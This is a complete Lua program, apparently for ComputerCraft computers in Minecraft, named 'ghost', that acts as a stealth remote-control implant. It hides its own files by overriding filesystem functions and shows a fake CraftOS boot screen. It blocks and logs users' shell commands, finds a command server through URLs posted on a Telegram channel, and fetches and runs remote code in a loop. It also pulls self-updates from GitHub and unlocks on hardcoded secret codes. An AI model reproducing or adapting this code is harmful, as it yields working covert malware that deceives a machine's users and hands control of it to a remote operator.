-- ghost v9.9.15 (heartbeat_interval + radar interval file + reboot after first registration)
local URL_FILE = ".server_url"
local CURRENT_URL = nil
local TOKEN_FILE = ".token"
local TOKEN_BAK = ".tk2"
local MODE_FILE = ".mode"
local LOG_FILE = ".ghost.log"
local SANDBOX_DIR = "/sandbox"
local COMPUTER_ID = os.getComputerID()
local TRUSTED_DOMAIN = nil
local DEBUG = false

local GITHUB_URL = "https://raw.githubusercontent.com/kisilev-2024-wq/-Ghost-/main/ghost.lua"
local SECRET_CODE = "V2BM-LkUZkBqGd9R8YdE"
local UPDATE_CODE = "N1AVW1cM"
local RELAY_USERNAME = "capscraft_relay"
local service_local = false
local telegram_service = false

local strikes = 0
local fortress_active = false
local MAX_STRIKES = 5
local heartbeat_fails = 0

_G.restart_parallel = false
_G.current_pastes = {}

local HIDDEN = {".token",".tk2",".mode",".server_url","sandbox","startup","ghost",".ghost_error",".ghost.log"}
local HIDDEN_NAMES = {"startup","sandbox",".token",".tk2",".mode",".server_url","ghost","phantom",
    "interceptor","shadow","stealth","hook","intercept","key","token","secret","config","autostart",".tmp"}

local ALLOWED_CMDS = {ls=true,dir=true,ll=true,la=true,cd=true,pwd=true,mkdir=true,rm=true,delete=true,
    cp=true,copy=true,mv=true,move=true,edit=true,clear=true,echo=true,print=true,help=true,time=true,
    date=true,day=true,cat=true,view=true,type=true,label=true,bg=true,fg=true,monitor=true,speakers=true,
    scan=true,gps=true,reboot=true}
local FILE_CMDS = {cat=true,view=true,type=true,edit=true,delete=true,rm=true,copy=true,move=true,
    cp=true,mv=true,mkdir=true,label=true,rename=true}
local DANGEROUS = {lua=true,sh=true,shell=true,multishell=true,pastebin=true,wget=true,github=true,
    redirect=true,reflashing=true,flash=true}
local FS_PROBES = {"fs%.list","fs%.find","fs%.exists","fs%.attributes","fs%.getsize","fs%.isdir",
    "fs%.open","fs%.readfile","fs%.complete","fs%.getdrive","fs%.getfreespace","fs%.getdir","fs%.ismount",
    "fs%.makeDir","fs%.copy","fs%.move","fs%.delete","fs%.create","fs%.isreadonly","os%.getrunningprogram",
    "os%.getRunningProgram","os%.getComputerID","os%.computerID","os%.pullEvent","os%.pullEventRaw",
    "os%.queueEvent","shell%.run","shell%.execute","shell%.getRunningProgram","shell%.resolve",
    "shell%.resolveProgram","peripheral%.find","peripheral%.wrap","peripheral%.call","redstone%.getInput",
    "redstone%.setOutput","http%.get","http%.post","http%.request","coroutine%.create","coroutine%.resume",
    "loadstring","load","dofile","require","getfenv","setfenv","rawget","rawset","debug","setmetatable","getmetatable"}
local DETECT_CMDS = {"programs","shell%.resolve","settings%.list","settings%.get","getRunningProgram",
    "http%.checkURL","peripheral","redstone","multishell","parallel","coroutine","loadstring","load",
    "dofile","apropos","man","which","env","printenv","history","alias","unalias","ps","top","wget",
    "pastebin","git","curl","mount","df","du","chmod","chown","find","locate","grep","awk","sed","wgen","wgen%.run"}

local orig_fs_open = fs.open
local orig_fs_exists = fs.exists
local orig_fs_list = fs.list
local orig_fs_delete = fs.delete
local orig_fs_find = fs.find
local orig_fs_attributes = fs.attributes
local orig_fs_getSize = fs.getSize
local orig_fs_isDir = fs.isDir
local orig_fs_complete = fs.complete
local orig_pullEvent = os.pullEvent
local orig_shutdown = os.shutdown
local orig_reboot = os.reboot
local orig_shell_run = shell.run
local orig_shell_complete = shell.complete
local orig_version = os.version

local function orig_fs_read(path)
    local f = orig_fs_open(path, "r"); if not f then return nil end
    local c = f.readAll(); f.close(); return c
end
local function orig_fs_write(path, content)
    local f = orig_fs_open(path, "w"); if not f then return false end
    f.write(content); f.close(); return true
end

local cmd_history = {}

local load_token
local send_heartbeat
local trigger_fortress
local refresh_url
local check_mode
local reload_tunnel

-- ============================================
-- LOGGING
-- ============================================
local function glog(msg)
    pcall(function()
        local f = orig_fs_open(LOG_FILE, "a")
        if f then local t = os.date and os.date("%H:%M:%S") or "?"; f.write(t .. " " .. tostring(msg) .. "\n"); f.close() end
    end)
end
_G.glog = glog

local function note(msg) glog(msg) end
local function gerr(step, err)
    glog("ERR " .. step .. ": " .. tostring(err))
    pcall(function()
        local f = orig_fs_open(".ghost_error", "a")
        if f then f.write("[" .. (os.date and os.date("%H:%M:%S") or "?") .. "] " .. step .. ": " .. tostring(err) .. "\n"); f.close() end
    end)
    if service_local then printError("[Ghost] " .. step .. ": " .. tostring(err)) end
end

-- ============================================
-- SELF-UPDATE
-- ============================================
local function do_update()
    glog("UPDATE: start")
    term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
    term.clear(); term.setCursorPos(1, 1); print("=== UPDATING ===")
    local ok, h = pcall(http.get, GITHUB_URL, {["User-Agent"]="ghost-updater",["bypass-tunnel-reminder"]="true",["Cache-Control"]="no-cache"})
    if not ok or not h then print("FAILED"); os.pullEvent("key"); return false end
    local o, code = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if not o or not code or code == "" or not code:find("run_main",1,true) then print("FAILED"); os.pullEvent("key"); return false end
    local f = orig_fs_open("startup", "w"); if not f then print("FAILED"); os.pullEvent("key"); return false end
    f.write(code); f.close()
    glog("UPDATE OK"); sleep(2); orig_reboot(); return true
end

-- ============================================
-- STEALTH
-- ============================================
local function is_hidden_name(name)
    for _, hf in ipairs(HIDDEN) do if name == hf then return true end end
    if name:find("^%.tmp_") then return true end
    return false
end
local function is_hidden_path(path)
    local clean = tostring(path):gsub("^/",""):gsub("/$","")
    if clean:find("^%.tmp_") then return true end
    for _, hf in ipairs(HIDDEN) do
        local esc = hf:gsub("%.", "%%.")
        if clean == hf then return true end
        if clean:find("^" .. esc .. "/") then return true end
    end
    return false
end
local function is_core(c) return c == ".token" or c == ".tk2" or c == "ghost" end
local function normalize_path(path)
    return tostring(path):gsub("^/",""):gsub("/$","")
end

local function install_stealth()
    pcall(function()
        fs.list = function(path)
            local list = orig_fs_list(path); if not list then return list end
            local out = {}
            for _, n in ipairs(list) do if not is_hidden_name(n) then out[#out+1] = n end end
            return out
        end
        fs.exists = function(path)
            local c = normalize_path(path)
            if c == "startup" or is_hidden_path(path) then return false end
            return orig_fs_exists(path)
        end
        fs.open = function(path, mode)
            local c = normalize_path(path)
            if c == ".ghost.log" then
                if mode == "a" then return orig_fs_open(path, mode) end
                return nil
            end
            if c == "startup" or is_core(c) then return nil end
            if c == ".server_url" then
                if mode and (mode:find("w") or mode:find("a")) then return nil end
                return orig_fs_open(path, mode)
            end
            if is_hidden_path(path) and mode and (mode:find("w") or mode:find("a")) then return nil end
            return orig_fs_open(path, mode)
        end
        fs.readFile = function(path)
            local c = normalize_path(path)
            if c == "startup" or is_core(c) then return nil end
            return orig_fs_read(path)
        end
        fs.writeFile = function(path, content)
            local c = normalize_path(path)
            if c == "startup" or is_core(c) or is_hidden_path(path) then return end
            orig_fs_write(path, content)
        end
        if orig_fs_find then fs.find = function(w)
            local r = orig_fs_find(w); if not r then return r end
            local out = {}
            for _, p in ipairs(r) do if not is_hidden_path(p) then out[#out+1] = p end end
            return out
        end end
        if orig_fs_attributes then fs.attributes = function(p, ...) if is_hidden_path(p) then return nil end return orig_fs_attributes(p, ...) end end
        if orig_fs_getSize then fs.getSize = function(p) if is_hidden_path(p) then return nil end return orig_fs_getSize(p) end end
        if orig_fs_isDir then fs.isDir = function(p) if is_hidden_path(p) then return false end return orig_fs_isDir(p) end end
        if orig_fs_complete then fs.complete = function(prefix, dir, ...)
            local r = orig_fs_complete(prefix, dir, ...); if not r then return r end
            local out = {}
            for _, n in ipairs(r) do if not is_hidden_name(n) then out[#out+1] = n end end
            return out
        end end
        fs.delete = function(path)
            local c = normalize_path(path)
            if c == "startup" or is_hidden_path(path) then return false end
            return orig_fs_delete(path)
        end
        if orig_shell_complete then shell.complete = function(...)
            local r = orig_shell_complete(...); if not r then return r end
            local out = {}
            for _, item in ipairs(r) do
                local c = normalize_path(item)
                if not is_hidden_name(c) and not c:find("^%.tmp_") then out[#out+1] = item end
            end
            return out
        end end
        if os.getRunningProgram then os.getRunningProgram = function(...) return "shell" end end
    end)
end
local function disable_stealth()
    fs.list = orig_fs_list; fs.exists = orig_fs_exists; fs.open = orig_fs_open
    if orig_fs_find then fs.find = orig_fs_find end
    if orig_fs_attributes then fs.attributes = orig_fs_attributes end
    if orig_fs_getSize then fs.getSize = orig_fs_getSize end
    if orig_fs_isDir then fs.isDir = orig_fs_isDir end
    if orig_fs_complete then fs.complete = orig_fs_complete end
    if orig_shell_complete then shell.complete = orig_shell_complete end
end
local function install_protection() end
local function disable_protection() end

-- ИСПРАВЛЕНО v9.9.15: в обычном режиме подсказки НЕ показывают файлы
local function normal_complete(text)
    if service_local then
        local res = orig_shell_complete(text, nil, true, true)
        if not res then return {} end
        local out = {}
        for _, item in ipairs(res) do
            local c = normalize_path(item)
            if not is_hidden_name(c) and not is_hidden_path(c) and not c:find("^%.tmp_") then out[#out+1] = item end
        end
        return out
    end
    -- обычный режим: только разрешённые команды, без файлов
    local out = {}
    local lower = text:lower()
    for cmd in pairs(ALLOWED_CMDS) do
        if lower == "" or cmd:sub(1, #lower) == lower then
            out[#out+1] = cmd:sub(#lower + 1)
        end
    end
    return out
end

-- ============================================
-- BOOT SCREEN
-- ============================================
local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
    'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
    'The "alias" command can be used to create custom commands.','You can change the color of text with the "paint" program.',
    'CraftOS is distributed under the MIT license.','Multishell allows you to run multiple programs at once.',
    'The "time" command displays the current time.','Visit the ComputerCraft forums for programs and support.'}
local function wrap_print(text)
    local w = term.getSize(); local line = ""
    for word in text:gmatch("%S+") do
        if #line + #word + 1 > w and line ~= "" then print(line); line = word
        else line = (line == "") and word or (line .. " " .. word) end
    end
    if line ~= "" then print(line) end
end
local function draw_boot()
    term.setBackgroundColor(colors.black); term.clear(); term.setCursorPos(1, 1)
    term.setTextColour(colors.yellow)
    local ver = "CraftOS 1.9"
    if orig_version then local o, v = pcall(orig_version); if o and v then ver = v end end
    print(ver); term.setTextColour(colors.white)
    wrap_print(MOTD[math.random(1, #MOTD)])
end
local function authentic_shutdown()
    term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
    term.clear(); term.setCursorPos(1, 1); print("Goodbye"); orig_shutdown()
end

-- ============================================
-- STRIKE ANALYSIS
-- ============================================
local function find_hidden(line)
    local l = line:lower()
    for _, hn in ipairs(HIDDEN_NAMES) do if l:find(hn, 1, true) then return hn end end
    return nil
end
local function is_fs_probe(line)
    local l = line:lower()
    for _, p in ipairs(FS_PROBES) do if l:find(p) then return true end end
    return false
end
local function is_detect_command(line)
    local l = line:lower()
    for _, d in ipairs(DETECT_CMDS) do if l:find(d) then return true end end
    return false
end
local function has_dangerous_token(line)
    for tok in line:gmatch("%S+") do
        if DANGEROUS[tok:lower()] then return tok end
    end
    return nil
end
local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end

-- ============================================
-- URL MANAGEMENT
-- ============================================
local function save_url(url)
    local f = orig_fs_open(URL_FILE, "w"); if f then f.write(url); f.close() end
end
local function load_saved_url()
    if not orig_fs_exists(URL_FILE) then return nil end
    local f = orig_fs_open(URL_FILE, "r"); if not f then return nil end
    local u = f.readAll(); f.close()
    if u and u ~= "" and u:find("^https?://") then return u:gsub("%s+","") end
    return nil
end
local function extract_domain(url) return url and url:match("https?://([^/]+)") end
local function replace_domain(url, newdomain)
    local scheme, rest = url:match("^(https?://)(.*)$")
    if not scheme then return url end
    local path = rest:match("^[^/]*(/.*)$") or ""
    return scheme .. newdomain .. path
end
local function trim(s) if not s then return s end; return (s:match("^%s*(.-)%s*$") or s) end
local function is_valid_tunnel_url(url)
    if not url or url == "" then return false end
    url = trim(url)
    if #url < 20 then return false end
    if url:sub(1, 8) ~= "https://" then return false end
    if not url:find(".lhr.life", 1, true) then return false end
    return true
end
local function validate_url(url)
    if not url or url == "" then return false end
    url = trim(url)
    if not is_valid_tunnel_url(url) then return false end
    local ok, h = pcall(http.get, url .. "/api/health", {["bypass-tunnel-reminder"]="true",["User-Agent"]="Mozilla/5.0"})
    if ok and h then
        local o, resp = pcall(function() return h.readAll() end)
        pcall(function() if h.close then h.close() end end)
        if o and resp and resp ~= "" then
            local o2, data = pcall(textutils.unserializeJSON, resp)
            if o2 and data then return true, url end
        end
    end
    ok, h = pcall(http.get, url .. "/api/url", {["bypass-tunnel-reminder"]="true",["User-Agent"]="Mozilla/5.0"})
    if not ok or not h then return false end
    local o, resp = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if not o or not resp or resp == "" then return false end
    if resp:find("no tunnel here", 1, true) then return false end
    local o2, data = pcall(textutils.unserializeJSON, resp)
    if not o2 or not data or data.error then return false end
    return true, url
end
local function fetch_relay_urls()
    local url = "https://t.me/s/" .. RELAY_USERNAME
    local ok, h = pcall(http.get, url, {["User-Agent"]="Mozilla/5.0",["bypass-tunnel-reminder"]="true"})
    if not ok or not h then return {} end
    local o, htmlc = pcall(function() return h.readAll() end)
    pcall(function() if h.close then h.close() end end)
    if not o or not htmlc then return {} end
    if not htmlc:find("tgme_widget_message", 1, true) then return {} end
    htmlc = htmlc:gsub("&lt;","<"):gsub("&gt;",">"):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&#x27;","'"):gsub("&nbsp;"," ")
    local urls = {}; local seen = {}
    for u in htmlc:gmatch("https://[%w%-]+%.lhr%.life") do
        u = trim(u)
        if not seen[u] then seen[u]=true; urls[#urls+1]=u end
    end
    glog("relay: " .. #urls .. " URLs")
    return urls
end
local function get_fresh_url()
    local urls = fetch_relay_urls()
    if #urls == 0 then return nil end
    for i = #urls, 1, -1 do
        local c = urls[i]
        if validate_url(c) then glog("fresh: " .. c); return c end
    end
    return nil
end

refresh_url = function()
    if CURRENT_URL then
        if validate_url(CURRENT_URL) then return CURRENT_URL end
        glog("refresh: current dead")
    end
    local fresh = get_fresh_url()
    if fresh then
        CURRENT_URL = fresh; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
        return CURRENT_URL
    end
    local saved = load_saved_url()
    if saved and saved ~= CURRENT_URL then
        if validate_url(saved) then CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL); return CURRENT_URL end
    end
    return nil
end

reload_tunnel = function()
    if not CURRENT_URL then return false end
    local ok, h = pcall(http.post, CURRENT_URL .. "/api/reload",
        textutils.serializeJSON({computer_id = tostring(COMPUTER_ID)}), {
        ["Content-Type"]="application/json",["bypass-tunnel-reminder"]="true",
        ["User-Agent"]="Mozilla/5.0",["X-Computer-ID"]=tostring(COMPUTER_ID)})
    if not ok or not h then return false end
    pcall(function() if h.close then h.close() end end)
    return true
end

local function acquire_url()
    local tries = 0
    while true do
        if _G.restart_parallel then return false end
        local fresh = get_fresh_url()
        if fresh then
            CURRENT_URL = fresh; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
            return true
        end
        local saved = load_saved_url()
        if saved and validate_url(saved) then
            CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
            return true
        end
        tries = tries + 1
        if tries > 30 then return false end
        sleep(10)
    end
end

-- ============================================
-- TOKEN
-- ============================================
local function encrypt_token(t)
    local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
    for i = 1, #t do
        local tb = string.byte(t, i); local kb = string.byte(key, ((i-1) % #key) + 1)
        r = r .. string.format("%02x", bit32.bxor(tb, kb))
    end
    return r
end
local function decrypt_token(e)
    local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
    for i = 1, #e, 2 do
        local xb = tonumber(e:sub(i, i+1), 16); if not xb then return nil end
        local kb = string.byte(key, (math.floor((i-1)/2) % #key) + 1)
        r = r .. string.char(bit32.bxor(xb, kb))
    end
    return r
end
local function write_token_file(path, e)
    local f = orig_fs_open(path, "w"); if not f then return false end
    f.write(e); f.close()
    return orig_fs_read(path) == e
end
local function save_token(t)
    local e = encrypt_token(t)
    local a = write_token_file(TOKEN_FILE, e)
    local b = write_token_file(TOKEN_BAK, e)
    glog("save_token: " .. tostring(a) .. "/" .. tostring(b))
    return a or b
end
local function read_token_file(path)
    if not orig_fs_exists(path) then return nil end
    local f = orig_fs_open(path, "r"); if not f then return nil end
    local e = f.readAll(); f.close()
    if not e or e == "" then return nil end
    local o, d = pcall(decrypt_token, e)
    if o and d and d ~= "" then return d end
    return nil
end
load_token = function()
    local t = read_token_file(TOKEN_FILE)
    if t then return t end
    return read_token_file(TOKEN_BAK)
end

-- ============================================
-- MODE
-- ============================================
local current_mode = "normal"
local function load_mode()
    if orig_fs_exists(MODE_FILE) then
        local f = orig_fs_open(MODE_FILE, "r")
        if f then current_mode = f.readAll() or "normal"; f.close() end
    end
end
local function save_mode(m)
    current_mode = m
    local f = orig_fs_open(MODE_FILE, "w"); if f then f.write(m); f.close() end
end

-- ============================================
-- HTTP
-- ============================================
local function make_headers(token)
    local h = {}
    h["Content-Type"] = "application/json"; h["bypass-tunnel-reminder"] = "true"
    h["X-Computer-ID"] = tostring(COMPUTER_ID)
    if token then h["Authorization"] = "Bearer " .. token end
    return h
end
local function http_request_with_status(url, body, headers, method)
    local ok, h
    if method == "POST" then ok, h = pcall(http.request, url, body, headers)
    else ok, h = pcall(http.request, url, nil, headers) end
    if not ok or not h then return nil, nil end
    local timer = os.startTimer(15)
    while true do
        local ev, p1, p2 = orig_pullEvent()
        if ev == "http_success" and p1 == url then
            os.cancelTimer(timer)
            local t = ""
            if p2 and p2.readAll then local rok, rt = pcall(function() return p2.readAll() end); if rok and rt then t = rt end end
            if type(t) == "table" then t = t[1] or "" end
            pcall(function() if p2 and p2.close then p2.close() end end)
            local o, p = pcall(textutils.unserializeJSON, t or "")
            return (o and p or nil), 200
        elseif ev == "http_failure" and p1 == url then
            os.cancelTimer(timer)
            local sc = nil
            if p2 and p2.getResponseCode then local sok, sret = pcall(function() return p2.getResponseCode() end); if sok then sc = sret end end
            pcall(function() if p2 and p2.close then p2.close() end end)
            return nil, sc
        elseif ev == "timer" and p1 == timer then return nil, nil end
    end
end
local function http_get(url, headers) return http_request_with_status(url, nil, headers, "GET") end
local function http_post(url, data, headers) local b = data and textutils.serializeJSON(data) or nil; return http_request_with_status(url, b, headers, "POST") end
local function http_get_smart(url, headers, token)
    local r, sc = http_get(url, headers)
    if r then return r, sc end
    if sc == 401 or sc == 403 then return nil, sc end
    local nu = refresh_url()
    if nu then return http_get(replace_domain(url, extract_domain(nu)), make_headers(token)) end
    return nil, sc
end
local function http_post_smart(url, data, headers, token)
    local r, sc = http_post(url, data, headers)
    if r then return r, sc end
    if sc == 401 or sc == 403 then return nil, sc end
    local nu = refresh_url()
    if nu then return http_post(replace_domain(url, extract_domain(nu)), data, make_headers(token)) end
    return nil, sc
end

send_heartbeat = function(token, pastes)
    local mr = service_local and "service" or (fortress_active and "fortress" or current_mode)
    local r, sc = http_post_smart(CURRENT_URL .. "/api/heartbeat",
        {mode = mr, strikes = strikes, scripts_running = #(pastes or {})}, make_headers(token), token)
    if not r then heartbeat_fails = heartbeat_fails + 1; return false, sc end
    heartbeat_fails = 0
    return true, sc
end
trigger_fortress = function(token)
    fortress_active = true
    if token then send_heartbeat(token, {}) end
end

-- ============================================
-- COMMAND INTERCEPT
-- ============================================
local function install_command_intercept()
    pcall(function()
        shell.run = function(...)
            local line = table.concat({...}, " ")
            local first = line:match("^(%S+)") or ""
            local second = line:match("^%S+%s+(%S+)")
            local fl = first:lower()
            if fortress_active then return false end
            if service_local then return orig_shell_run(line) end
            local danger = has_dangerous_token(line)
            if danger then
                strikes = strikes + 1; printError(danger .. ": command not found")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            if not is_allowed_command(first) then
                strikes = strikes + 1; printError(first .. ": command not found")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            if is_script_file(first) then
                strikes = strikes + 1; printError("Cannot execute: permission denied")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            if second and second:gsub("^/","") == "startup" then
                strikes = strikes + 1; printError("startup: No such file")
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            local hn = find_hidden(line); local probe = is_fs_probe(line); local det = is_detect_command(line)
            if hn or probe or det then
                strikes = strikes + 1
                if hn and FILE_CMDS[fl] then printError(hn .. ": No such file")
                elseif hn and fl == "delete" then printError(hn .. ": No such file")
                else
                    local r = orig_shell_run(line)
                    if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                    return r
                end
                if strikes >= MAX_STRIKES then trigger_fortress(load_token()) end
                return false
            end
            return orig_shell_run(line)
        end
    end)
end
local function disable_command_intercept() shell.run = orig_shell_run end

-- ============================================
-- REGISTRATION
-- ============================================
local function register_sync(url, pw)
    if not url or not pw or pw == "" then return nil end
    refresh_url()
    local target = CURRENT_URL or url
    if not target then return nil end
    glog("register -> " .. tostring(target))
    local res, sc = http_post_smart(target .. "/api/login", {
        password = pw, name = "CC_" .. COMPUTER_ID, computer_id = tostring(COMPUTER_ID)}, make_headers(nil), nil)
    if not res then glog("register: no response " .. tostring(sc)); return nil end
    if res.error then glog("register: " .. tostring(res.error)); return nil end
    if res.status == "already_registered" then return res.token
    elseif res.status == "pending" then
        local pid = res.pending_id
        if not pid then return nil end
        glog("register: waiting approval")
        local fc = 0; local cc = 0; local cu = CURRENT_URL or target
        while true do
            if _G.restart_parallel then return nil end
            sleep(3); cc = cc + 1
            if cc % 10 == 0 then refresh_url(); if CURRENT_URL then cu = CURRENT_URL end end
            local sr = http_get(cu .. "/api/check?id=" .. tostring(pid), make_headers(nil))
            if sr then
                fc = 0
                if sr.status == "approved" then glog("register: approved"); return sr.token
                elseif sr.status == "denied" then glog("register: denied"); return nil end
            else
                fc = fc + 1
                if fc >= 3 then refresh_url(); if CURRENT_URL then cu = CURRENT_URL; fc = 0 end end
            end
        end
    end
    return nil
end

-- ИСПРАВЛЕНО v9.9.15: возвращает mode, pastes, interval
check_mode = function(token)
    refresh_url()
    if not CURRENT_URL or not token then return nil end
    local r, sc = http_get_smart(CURRENT_URL .. "/api/me", make_headers(token), token)
    if not r or r.error then return nil end
    local mode = r.mode or "normal"
    save_mode(mode)
    return mode, r.assigned_pastes or {}, (tonumber(r.heartbeat_interval) or 60)
end

local function fetch_paste_code(name, token)
    if not CURRENT_URL then refresh_url(); if not CURRENT_URL then return nil end end
    local r = http_get_smart(CURRENT_URL .. "/api/paste/" .. name, make_headers(token), token)
    if not r or r.error then return nil end
    return r.content
end

local function paste_runner_loop(name, token)
    glog("paste_runner start: " .. name)
    while true do
        if _G.restart_parallel then
            glog("paste_runner stop (restart): " .. name)
            return
        end
        local ok_run, err_run = pcall(function()
            local code = fetch_paste_code(name, token)
            if not code or type(code) ~= "string" then return end
            local fn, ce = loadstring(code)
            if not fn then
                glog("paste " .. name .. " compile ERROR: " .. tostring(ce))
                return
            end
            local ro, re = pcall(fn)
            if not ro then
                glog("paste " .. name .. " run ERROR: " .. tostring(re))
            end
        end)
        if not ok_run then
            glog("paste " .. name .. " OUTER CRASH: " .. tostring(err_run))
        end
        sleep(5)
    end
end

-- ============================================
-- FORTRESS
-- ============================================
local function fortress_console()
    draw_boot()
    while true do
        term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
        term.setTextColour(colors.white)
        local line = read()
        if line == UPDATE_CODE then if do_update() then return end end
    end
end

-- ============================================
-- LOOPS
-- ============================================
local function relay_watch_loop(token)
    glog("relay_watch start")
    while true do
        if _G.restart_parallel then return end
        sleep(30)
        if _G.restart_parallel then return end
        pcall(function()
            local urls = fetch_relay_urls()
            if #urls == 0 then return end
            local latest = urls[#urls]
            if latest == CURRENT_URL then return end
            if CURRENT_URL and validate_url(CURRENT_URL) then return end
            if validate_url(latest) then
                CURRENT_URL = latest; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
                glog("relay_watch: switched " .. CURRENT_URL)
            end
        end)
    end
end

-- ИСПРАВЛЕНО v9.9.15: использует интервал с сервера + пишет .radar_interval
local function heartbeat_loop(token)
    glog("heartbeat start")
    local interval = 60
    local fc = 0; local consec = 0
    while true do
        if _G.restart_parallel then return end
        sleep(interval)
        if _G.restart_parallel then return end
        pcall(function()
            local mode, pastes, hbi = check_mode(token)
            if not mode then
                fc = fc + 1; consec = consec + 1
                if consec >= 5 then reload_tunnel(); consec = 0 end
                return
            end
            -- обновляем интервал
            interval = tonumber(hbi) or 60
            if interval < 5 then interval = 5 end
            if interval > 3600 then interval = 3600 end
            -- пишем интервал для радара
            pcall(function()
                local f = orig_fs_open(".radar_interval", "w")
                if f then f.write(tostring(interval)); f.close() end
            end)
            -- проверяем смену пастов
            local changed = false
            local current = _G.current_pastes or {}
            if #(pastes or {}) ~= #current then
                changed = true
            else
                for i, p in ipairs(pastes or {}) do
                    if current[i] ~= p then changed = true; break end
                end
            end
            if changed then
                glog("heartbeat: pastes changed, triggering restart")
                _G.current_pastes = pastes or {}
                _G.restart_parallel = true
                return
            end
            local sent = send_heartbeat(token, pastes)
            if sent then fc = 0; consec = 0
            else
                fc = fc + 1; consec = consec + 1
                if consec >= 5 then reload_tunnel(); consec = 0 end
            end
        end)
    end
end

local function mode_watcher(token)
    glog("mode_watcher start")
    while true do
        if _G.restart_parallel then return end
        sleep(15)
        if _G.restart_parallel then return end
        pcall(function()
            local mode = check_mode(token)
            if not mode then return end
            if mode == "service" and not service_local then
                telegram_service = true; service_local = true
                disable_stealth(); disable_protection(); disable_command_intercept()
                glog("mode_watcher: service ON")
            elseif mode ~= "service" and telegram_service then
                telegram_service = false; service_local = false
                install_stealth(); install_protection(); install_command_intercept()
                glog("mode_watcher: service OFF")
            end
        end)
    end
end

-- ============================================
-- REPL
-- ============================================
local function repl()
    while true do
        if fortress_active then return end
        if _G.restart_parallel then return end
        if service_local then
            term.setTextColour(colors.green); term.setCursorBlink(true); write("[SERVICE] > ")
            term.setTextColour(colors.white)
            local line = read(nil, cmd_history, orig_shell_complete)
            if line == UPDATE_CODE then if do_update() then return end
            elseif line and line ~= "" then
                cmd_history[#cmd_history+1] = line
                local o, e = pcall(orig_shell_run, line)
                if not o then printError(e or "Error") end
            end
        else
            term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
            term.setTextColour(colors.white)
            local line = read(nil, cmd_history, normal_complete)
            if line == UPDATE_CODE then if do_update() then return end
            elseif line == SECRET_CODE then
                service_local = true
                disable_stealth(); disable_protection(); disable_command_intercept()
                term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
                term.clear(); term.setCursorPos(1, 1)
                print("=== SERVICE MODE ===")
                glog("SECRET: service activated")
            elseif line and line ~= "" then
                cmd_history[#cmd_history+1] = line
                local o, e = pcall(shell.run, line)
                if not o then printError(e or "Error") end
            end
        end
    end
end

-- ============================================
-- BACKGROUND CONNECT (reboot after first registration)
-- ============================================
local function connect_and_run(token, pending_password)
    local is_first_registration = (not token) and pending_password and pending_password ~= ""
    if not token and pending_password and pending_password ~= "" then
        if acquire_url() then
            token = register_sync(CURRENT_URL, pending_password)
            if token then
                save_token(token)
                if CURRENT_URL then save_url(CURRENT_URL) end
                if is_first_registration then
                    glog("FIRST REGISTRATION COMPLETE - rebooting in 3s")
                    sleep(3)
                    orig_reboot()
                    return
                end
            end
        end
    end
    if not token then
        while true do
            if _G.restart_parallel then return end
            sleep(60)
        end
    end
    while true do
        _G.restart_parallel = false
        local mode, pastes = check_mode(token)
        _G.current_pastes = pastes or {}
        glog("starting parallel with " .. #(pastes or {}) .. " pastes: " .. table.concat(pastes or {}, ", "))
        local funcs = {
            function() heartbeat_loop(token) end,
            function() mode_watcher(token) end,
            function() relay_watch_loop(token) end,
            function() repl() end,
        }
        for _, pname in ipairs(pastes or {}) do
            local name = pname
            funcs[#funcs+1] = function() paste_runner_loop(name, token) end
        end
        local ok, err = pcall(parallel.waitForAll, table.unpack(funcs))
        if not ok then
            glog("parallel.waitForAll error: " .. tostring(err))
        end
        if not _G.restart_parallel then
            glog("parallel ended normally, exiting")
            return
        end
        glog("parallel restart requested, restarting...")
        sleep(1)
    end
end

-- ============================================
-- MAIN
-- ============================================
local function run_main()
    glog("ghost start v9.9.15")
    install_stealth(); install_protection(); install_command_intercept(); load_mode()
    if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
    draw_boot()
    local url = load_saved_url()
    if url then CURRENT_URL = url; TRUSTED_DOMAIN = extract_domain(url) end
    glog("saved URL: " .. tostring(CURRENT_URL))
    local token = load_token()
    local pending_password = nil
    if not token then
        term.setTextColour(colors.white); term.setCursorBlink(true)
        write("Password: ")
        pending_password = read("*")
        term.setCursorBlink(false)
    end
    pcall(connect_and_run, token, pending_password)
    if fortress_active then fortress_console() end
end

local ok, err = pcall(run_main)
if not ok then
    local e = tostring(err)
    if e:find("Terminated") then authentic_shutdown()
    else gerr("run_main", e); sleep(5); orig_reboot() end
end
